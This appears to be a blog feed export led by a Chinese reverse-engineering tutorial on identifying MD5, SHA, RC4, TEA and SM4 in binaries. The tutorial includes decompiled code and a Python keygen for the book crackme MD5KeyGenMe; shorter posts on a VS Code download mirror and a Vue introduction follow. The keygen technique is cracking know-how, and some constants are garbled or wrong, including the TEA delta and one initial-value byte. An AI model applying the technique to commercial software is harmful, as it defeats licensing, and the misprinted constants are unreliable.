      <title>逆向中常见的Hash算法和对称加密算法</title>
      <link href="/2024/10/30/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86/"/>
      <url>/2024/10/30/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h2 id="1-单向散列算法"><a href="#1-单向散列算法" class="headerlink" title="1 单向散列算法"></a>1 单向散列算法</h2><p>单向散列函数算法也称Hash（哈希）算法，是一种将任意长度的消息压缩到某一固定长度（消息摘要）的函数（该过程不可逆）。Hash函数可用于数字签名、消息的完整性检测、消息起源的认证检测等。常见的<br>散列算法有MD5、SHA、RIPE-MD、HAVAL、N-Hash等。</p><p>在软件的加密保护中，Hash函数是经常用到的加密算法。但是，由于Hash函数为不可逆算法，所以<br>软件只能使用Hash函数作为一个加密的中间步骤。例如，对用户名做一个Hash变换，将这个结果再进行<br>一个可逆的加密变换（如对称密码），变换结果为注册码。从解密角度来说，一般不必了解Hash函数的<br>具体内容（变种算法除外），只要能识别出是何种Hash函数就可以了，然后直接套用相关算法源码实现。</p><h3 id="1-1-MD5算法"><a href="#1-1-MD5算法" class="headerlink" title="1.1 MD5算法"></a>1.1 MD5算法</h3><p>MD5算法消息摘要算法对任意长度的消息进行运算，产生一个128位的消息摘要。近年来，随着穷举攻击和密码分析的发展，应用最为广泛的MD5算法已经不再那么流行了。</p><h4 id="1-1-1-算法原理"><a href="#1-1-1-算法原理" class="headerlink" title="1.1.1 算法原理"></a>1.1.1 算法原理</h4><ol><li><p>数据填充</p><p>填充消息使其长度与448模512同余（即长度&#x3D;448 mod512）。也就是说，填充后的消息长度比512<br>的倍数仅小64位的数。即使消息长度本身已经满足上述长度要求，仍然需要填充。 填充方法是附一个1在消息后面，然后用0来进行填充，直到消息的长度与448模512同余。至少填<br>充1位，至多填充512位。</p></li><li><p>添加长度</p><p>在第一步的结果之后附上64位的消息长度。如果填充前消息的长度大于24，贝 则只使用其低64位。<br>这时，在添加完填充位和消息长度之后，最终消息的长度正好就是512的整数倍了。 令M[0…N-1]表示最终的消息，其中N是16的倍数。</p></li><li><p>初始化变量</p><p>用到4个变量 量（A，B,C,D）来计算消息摘要。这里A,B,C,D分别都是一个32位的寄存器。这些寄 存器以下面的十六进制数值来初始化：A&#x3D;01234567h，<br>B&#x3D;89abcdefh, C&#x3D;fedcba98h, D&#x3D;76543210h。 并且在内存中是以低字节在前的形式来存储的，民 即如下格式：</p><p><strong>01 23 45 67 89 AB CD EF FE DC BA 86 76 54 32 10</strong></p></li><li><p>数据处理<br><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image.png" alt="image.png"></p></li><li><p>输出</p><p>当所有的512位分组都运算完毕后，ABCD的级联将被输出为MD5散列的结果。以上是MD5算法的 简单描述，更 更为详细的实现程序，<br>请参考光盘中的源代码。</p></li></ol><h4 id="1-1-2-示例"><a href="#1-1-2-示例" class="headerlink" title="1.1.2 示例"></a>1.1.2 示例</h4><p>使用加密与解密中的随书文件<strong>MD5KeyGenMe.exe</strong>来分析<br><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%201.png" alt="image 1.png"></p><p>打开程序发现需要输入两个text来进行验证，通过导入表中的**<code>GetDlgItemTextA</code>**函数定位到关键代码</p><p><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%202.png" alt="image 2.png"><br><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%203.png" alt="image 3.png"><br><code>sub_4010A0</code>函数反编译后的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_4010A0(HWND hDlg)</span><br><span class="line">&#123;</span><br><span class="line">  UINT DlgItemTextA; // edi</span><br><span class="line">  int v2; // eax</span><br><span class="line">  int i; // eax</span><br><span class="line">  int v4; // ecx</span><br><span class="line">  CHAR String1[17]; // [esp+10h] [ebp-3C8h] BYREF</span><br><span class="line">  __int16 v7; // [esp+21h] [ebp-3B7h]</span><br><span class="line">  char v8; // [esp+23h] [ebp-3B5h]</span><br><span class="line">  CHAR v9[24]; // [esp+24h] [ebp-3B4h] BYREF</span><br><span class="line">  char v10[36]; // [esp+3Ch] [ebp-39Ch] BYREF</span><br><span class="line">  CHAR v11[197]; // [esp+60h] [ebp-378h] BYREF</span><br><span class="line">  __int16 v12; // [esp+125h] [ebp-2B3h]</span><br><span class="line">  char v13; // [esp+127h] [ebp-2B1h]</span><br><span class="line">  _DWORD v14[22]; // [esp+128h] [ebp-2B0h] BYREF</span><br><span class="line">  _BYTE v15[197]; // [esp+180h] [ebp-258h] BYREF</span><br><span class="line">  __int16 v16; // [esp+245h] [ebp-193h]</span><br><span class="line">  char v17; // [esp+247h] [ebp-191h]</span><br><span class="line">  CHAR String[197]; // [esp+248h] [ebp-190h] BYREF</span><br><span class="line">  __int16 v19; // [esp+30Dh] [ebp-CBh]</span><br><span class="line">  char v20; // [esp+30Fh] [ebp-C9h]</span><br><span class="line">  CHAR String2[197]; // [esp+310h] [ebp-C8h] BYREF</span><br><span class="line">  __int16 v22; // [esp+3D5h] [ebp-3h]</span><br><span class="line">  char v23; // [esp+3D7h] [ebp-1h]</span><br><span class="line"></span><br><span class="line">  memset(String, 0, sizeof(String));</span><br><span class="line">  memset(v15, 0, sizeof(v15));</span><br><span class="line">  v19 = 0;</span><br><span class="line">  v20 = 0;</span><br><span class="line">  memset(String2, 0, sizeof(String2));</span><br><span class="line">  v16 = 0;</span><br><span class="line">  v17 = 0;</span><br><span class="line">  memset(v11, 0, sizeof(v11));</span><br><span class="line">  v22 = 0;</span><br><span class="line">  v23 = 0;</span><br><span class="line">  v12 = 0;</span><br><span class="line">  v13 = 0;</span><br><span class="line">  qmemcpy(v9, aWwwPediyCom, 0x15u);</span><br><span class="line">  strcpy(v10, &quot;23456789ABCDEFGHJKLMNPQRSTUVWXYZ&quot;);</span><br><span class="line">  v7 = 0;</span><br><span class="line">  memset(String1, 0, sizeof(String1));</span><br><span class="line">  v8 = 0;</span><br><span class="line">  DlgItemTextA = GetDlgItemTextA(hDlg, 1000, String, 201);</span><br><span class="line">  if ( !DlgItemTextA )</span><br><span class="line">    goto LABEL_10;</span><br><span class="line">  if ( GetDlgItemTextA(hDlg, 1001, v11, 201) != 19 )</span><br><span class="line">    goto LABEL_10;</span><br><span class="line">  if ( v11[4] != 45 )</span><br><span class="line">    goto LABEL_10;</span><br><span class="line">  if ( v11[9] != 45 )</span><br><span class="line">    goto LABEL_10;</span><br><span class="line">  if ( v11[14] != 45 )</span><br><span class="line">    goto LABEL_10;</span><br><span class="line">  *(_DWORD *)&amp;String1[4] = *(_DWORD *)&amp;v11[5];</span><br><span class="line">  *(_DWORD *)String1 = *(_DWORD *)v11;</span><br><span class="line">  *(_DWORD *)&amp;String1[8] = *(_DWORD *)&amp;v11[10];</span><br><span class="line">  *(_DWORD *)&amp;String1[12] = *(_DWORD *)&amp;v11[15];</span><br><span class="line">  sub_4012B0(v14);</span><br><span class="line">  sub_4012E0(v14, String, DlgItemTextA);</span><br><span class="line">  v2 = lstrlenA(v9);</span><br><span class="line">  sub_4012E0(v14, v9, v2);</span><br><span class="line">  sub_401390(v15, v14);</span><br><span class="line">  for ( i = 0; i &lt; 16; String2[i - 1] = v10[v4] )</span><br><span class="line">    v4 = v15[i++] &amp; 0x1F;</span><br><span class="line">  if ( !lstrcmpA(String1, String2) )</span><br><span class="line">  &#123;</span><br><span class="line">    SetDlgItemTextA(hDlg, 1001, ::String);</span><br><span class="line">    return 1;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">    SetDlgItemTextA(hDlg, 1001, aWrongSerial);</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跟进函数<code>sub_4012B0</code>发现MD5特征</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__cdecl sub_4012B0(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; // eax</span><br><span class="line"></span><br><span class="line">  result = a1;</span><br><span class="line">  a1[5] = 0;</span><br><span class="line">  a1[4] = 0;</span><br><span class="line">  *a1 = 0x67452301;</span><br><span class="line">  a1[1] = 0xEFCDAB89;</span><br><span class="line">  a1[2] = 0x98BADCFE;</span><br><span class="line">  a1[3] = 0x10325476;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当然也可以直接使用插件判断算法</p><p><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%204.png" alt="image 4.png"><br>分析代码<br><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%205.png" alt="image 5.png"></p><p>把name和pediy.com做一个拼接，然后在做一次变换得倒最终的序列号</p><p>编写注册机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from hashlib import md5</span><br><span class="line"></span><br><span class="line">name = b&#x27;bjw&#x27;</span><br><span class="line"># 坑 这里不能用hex</span><br><span class="line">digest = md5(name + b&#x27;www.pediy.com&#x27;).digest()</span><br><span class="line">print(f&#x27;MD5(&#123;name&#125;)=&#123;digest.hex()&#125;&#x27;)</span><br><span class="line">a2345 = &#x27;23456789ABCDEFGHJKLMNPQRSTUVWXYZ&#x27;</span><br><span class="line">serial_number = &#x27;&#x27;</span><br><span class="line">for b in digest:</span><br><span class="line">    serial_number += a2345[b &amp; 0x1F]</span><br><span class="line">print(f&#x27;Serial Number(&#123;name&#125;)=&#123;serial_number[0:4]&#125;-&#123;serial_number[4:8]&#125;-&#123;serial_number[8:12]&#125;-&#123;serial_number[12:16]&#125;&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-2-其他算法"><a href="#1-2-其他算法" class="headerlink" title="1.2 其他算法"></a>1.2 其他算法</h3><p>SHA算法特征值</p><p><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%206.png" alt="image 6.png"><br><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%207.png" alt="image 7.png"></p><h2 id="2-对称加密算法"><a href="#2-对称加密算法" class="headerlink" title="2 对称加密算法"></a>2 对称加密算法</h2><p>常见的对称分组加密算法有 DES(Data EncryptionStandard)、IDEA（Intemational 1Data Encryption<br>Algorithm）、AES（AdvancedEncryptionStandard）、BlowFish、Twofish等。本节将以常见的对称加密算法TEA、IDEA、BlowFish、AES及流密码RC4为例，介绍对称算法在软件保护中的应用。感兴趣的读者可<br>以进一步阅读密码学相关书籍，如《对称密码学》（机械工业出版社）来了解更多的关于对称密码的知识。</p><h3 id="2-1-RC4流密码"><a href="#2-1-RC4流密码" class="headerlink" title="2.1 RC4流密码"></a>2.1 RC4流密码</h3><p>RC4生成一种称为密钥流的伪随机流，它同明文通过异或操作相混合以达到加密的目的，解密时，同密文进行异或操作。其密钥流的生成由两部分组成：KSA和PRGA。</p><p><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%208.png" alt="image 8.png"><br>(1） KSA ( the Key-Scheduling Algorithn )</p><p>RC4 首先使用密钥调度算法（KSA）完成对大小为 256字节的数组S的初始化及替换，在替 换时使用密钥。其密钥的长度一般取 5～16 字节，即<br>40～128 位，也可以更长，通常不超过 256 位。先用0～255初始化数组S，然后使用密钥进行替换，伪代码如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for i=0 to 255 do</span><br><span class="line">  S[i]:=i;</span><br><span class="line">j:=0;</span><br><span class="line"></span><br><span class="line">for i=0 to 255 do</span><br><span class="line">  j:=(j+S[i]+key[i mod keylength]) mod 256; //重复使用密钥</span><br><span class="line">  Swap(s[i],S[j]); //交换s[i]与s[j]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(2） PRGA( the Pseudo-Random Generation Algorithm) 数组S在完成初始化之后，便不再使用输人的密钥。密钥流的生成是从ST0]<br>到ST255]的。对每 个S[]，根据当前S的值，将S[]与S中的另一字节置换。在S[255]完成转换后，操作仍重复执行。 伪代码如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">i,j=0;</span><br><span class="line">while(明文未结束)</span><br><span class="line">  i=(i+1）mod 256;</span><br><span class="line">  j=（j+S[i]）mod256;</span><br><span class="line">  Swap(s[i],S[j]);</span><br><span class="line">  t=(S[i]+S[j]）mod256;</span><br><span class="line">  k=S[t];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到的子密码k用于和明文进行XOR运算，得到密文。解密过程也完全相同。由于RC4算法 在加密时采用的是XOR运算，一旦子密钥序列出现了重复，密文就有可能被破解。因此，在使用<br>RC4算法时，必须对加密密钥进行测试，以判断其是否为弱密钥。</p><h3 id="2-2-TEA算法"><a href="#2-2-TEA算法" class="headerlink" title="2.2 TEA算法"></a>2.2 TEA算法</h3><p>TEA是分组密码，分组长度为64位，密钥长度为128位，采用Feistel网络。</p><p>其加密过程也比较简单。</p><p>算法的特征为<code>delta = 0x9E377989</code>，这个常量是由黄金分割点得来的。TEA的变种算法也常用到这个变量，但是加密过程不同。</p><p>在加密轮数方面，作者推荐的加密轮数是64轮，即循环32次，也可以采用其他加密轮数，比如32轮或者128轮，在分析的时候也需要注意。</p><p>如下图：</p><p><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%209.png" alt="image 9.png"></p><h3 id="2-3-SM4国密算法"><a href="#2-3-SM4国密算法" class="headerlink" title="2.3 SM4国密算法"></a>2.3 SM4国密算法</h3><p>SM4是一个分组算法，分组长度为128比特，密钥成都为128比特其结构是Fesitel网络的一个变体。</p><p>SM4的特征为S-box</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">static const unsigned char SboxTable[16][16] =</span><br><span class="line">&#123;</span><br><span class="line">&#123;0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05&#125;,</span><br><span class="line">&#123;0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99&#125;,</span><br><span class="line">&#123;0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62&#125;,</span><br><span class="line">&#123;0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6&#125;,</span><br><span class="line">&#123;0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8&#125;,</span><br><span class="line">&#123;0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35&#125;,</span><br><span class="line">&#123;0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87&#125;,</span><br><span class="line">&#123;0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e&#125;,</span><br><span class="line">&#123;0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1&#125;,</span><br><span class="line">&#123;0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3&#125;,</span><br><span class="line">&#123;0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f&#125;,</span><br><span class="line">&#123;0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51&#125;,</span><br><span class="line">&#123;0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8&#125;,</span><br><span class="line">&#123;0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0&#125;,</span><br><span class="line">&#123;0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84&#125;,</span><br><span class="line">&#123;0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../imgs/%E9%80%86%E5%90%91%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84Hash%E7%AE%97%E6%B3%95%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%2012fe7c086b3080088cf1e2c306f6e97a/image%2010.png" alt="image 10.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode下载过慢解决</title>
      <link href="/2023/07/19/vscode%E4%B8%8B%E8%BD%BD%E8%BF%87%E6%85%A2%E8%A7%A3%E5%86%B3/"/>
      <url>/2023/07/19/vscode%E4%B8%8B%E8%BD%BD%E8%BF%87%E6%85%A2%E8%A7%A3%E5%86%B3/</url>
      
        <content type="html"><![CDATA[<p>从官网下载：</p><p><a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p><p>使用自带的Safari浏览器，步骤如下：</p><p>进入vscode官方网站：<a href="https://code.visualstudio.com/Download">https://code.visualstudio.com/Download</a></p><p>点击Mac下载vscode最新版本</p><p>可以看到，下载速度相当的缓慢！！！</p><p>解决步骤</p><p>点击下载项，鼠标右键，拷贝下载项真实地址：</p><p>如：<a href="https://az764295.vo.msecnd.net/stable/74f6148eb9ea00507ec113ec51c489d6ffb4b771/VSCode-darwin.zip">https://az764295.vo.msecnd.net/stable/c3f126316369cd610563c75b1b1725e0679adfb3/VSCode-darwin-universal.zip</a></p><p>修改上面地址的域名：</p><p>把 az764295.vo.msecnd.net 替换成 vscode.cdn.azure.cn，这是国内的镜像，再把下面的地址copy到浏览器，再按回车</p><p><a href="https://vscode.cdn.azure.cn/stable/74f6148eb9ea00507ec113ec51c489d6ffb4b771/VSCode-darwin.zip">https://vscode.cdn.azure.cn/stable/c3f126316369cd610563c75b1b1725e0679adfb3/VSCode-darwin-universal.zip</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue入门</title>
      <link href="/2023/02/19/Vue%E5%85%A5%E9%97%A8/"/>
      <url>/2023/02/19/Vue%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="什么是Vue？"><a href="#什么是Vue？" class="headerlink" title="什么是Vue？"></a>什么是Vue？</h3><p>Vue (发音为 &#x2F;vjuː&#x2F;，类似<strong>view</strong><br>) 是一款用于构建用户界面的 JavaScript 框架。它基于标准 HTML、CSS 和 JavaScript<br>构建，并提供了一套声明式的、组件化的编程模型，帮助你高效地开发用户界面。无论是简单还是复杂的界面，Vue 都可以胜任。</p><p>示例</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;createApp&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">createApp</span>(&#123;</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">count</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;button @click=&quot;count++&quot;&gt;</span><br><span class="line">    Count is: &#123;&#123; count &#125;&#125;</span><br><span class="line">  &lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>vue的两个核心功能：</p><ul><li><strong>声明式渲染</strong>：Vue 基于标准 HTML 拓展了一套模板语法，使得我们可以声明式地描述最终输出的 HTML 和 JavaScript 状态之间的关系。</li><li><strong>响应性</strong>：Vue 会自动跟踪 JavaScript 状态并在其发生变化时响应式地更新 DOM。</li></ul><h3 id="渐进式框架"><a href="#渐进式框架" class="headerlink" title="渐进式框架"></a>渐进式框架</h3><p>Vue 是一个框架，也是一个生态。其功能覆盖了大部分前端开发常见的需求。但 Web 世界是十分多样化的，不同的开发者在 Web<br>上构建的东西可能在形式和规模上会有很大的不同。考虑到这一点，Vue 的设计非常注重灵活性和“可以被逐步集成”这个特点。根据你的需求场景，你可以用不同的方式使用<br>Vue：</p><ul><li>无需构建步骤，渐进式增强静态的 HTML</li><li>在任何页面中作为 Web Components 嵌入</li><li>单页应用 (SPA)</li><li>全栈 &#x2F; 服务端渲染 (SSR)</li><li>Jamstack &#x2F; 静态站点生成 (SSG)</li><li>开发桌面端、移动端、WebGL，甚至是命令行终端中的界面</li></ul><h3 id="单文件组件"><a href="#单文件组件" class="headerlink" title="单文件组件"></a>单文件组件</h3><p>.vue文件称为单文件组件，顾名思义，Vue 的单文件组件会将一个组件的逻辑 (JavaScript)，模板 (HTML) 和样式 (CSS) 封装在同一个文件里。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">count</span>: <span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span 